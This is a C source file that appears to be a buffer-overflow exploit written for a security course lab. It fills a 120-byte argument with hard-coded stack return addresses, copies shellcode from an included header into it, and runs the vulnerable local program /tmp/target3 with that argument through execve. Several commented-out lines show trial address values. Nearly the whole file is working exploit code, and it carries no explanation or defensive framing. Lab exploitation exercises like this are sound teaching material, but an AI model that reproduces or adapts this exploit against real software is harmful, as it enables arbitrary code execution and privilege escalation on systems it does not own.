#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>
#include <unistd.h>
#include "shellcode.h"

#define TARGET "/tmp/target3"
#define SIZE 120
#define NOP 0x90
int main(void)
{

		char arg1[SIZE];
	//char arg1[] = "Hi there!";
	  long retAddr, *addrPtr;
//retAddr = 0xbefed598;
//retAddr = 0x98befed5;
//  retAddr = 0x98befed5;
  retAddr = 0xbefffcac;

long dong = 0x00008802;

  addrPtr = (long *) arg1; 
//  *((int *) (arg1 + 156))
//addrPtr = *((long *) (arg1+2));

  int i;
*(addrPtr++) = 0xbefffcbc;

  for (i = 0; i < SIZE-4; i += 4)
    *(addrPtr++) = retAddr;

//*(addrPtr++) = 0x88c5;
//
//*(addrPtr++) =  0xb6e5b384;//"\x84\xbe\xe5\xb6";
//*(addrPtr++) =  0xb6e5595c;//"\x5c\x59\xe5\xb6";
//*(addrPtr++) =  0xbefffcb8;//"\xb8\xfc\xff\xbe";
/*
*(addrPtr++) = 0xb5084802;
*(addrPtr++) = 0xf0004478;
*(addrPtr++) = 0xbf00f803;
*(addrPtr++) = 0x00033bac;
*(addrPtr++) = retAddr;
*/

//*(addrPtr++) = 0xbefffcc8;
//	arg1[SIZE-1] = 0;
	//char result[strlen(shellcode)];
	//memcpy(result, shellcode, sizeof(shellcode));
//memcpy(arg1+32, dong, strlen(dong));
	memcpy(arg1+4, shellcode, strlen(shellcode));
		//arg1[SIZE-1] = 0;

		//arg1[SIZE-1] = 0;
	//memcpy(arg1 + strlen(shellcode),'\0', 1);
	//arg1[sizeof(shellcode)-1] = '\0';
	char arg2[] = "0";
	char arg3[] = "0";
	char *args[] = { TARGET, arg1, arg2, arg3, NULL };
	char *env[] = { NULL };

	if (0 > execve(TARGET, args, env))
		fprintf(stderr, "execve failed.\n");

	return 0;
}
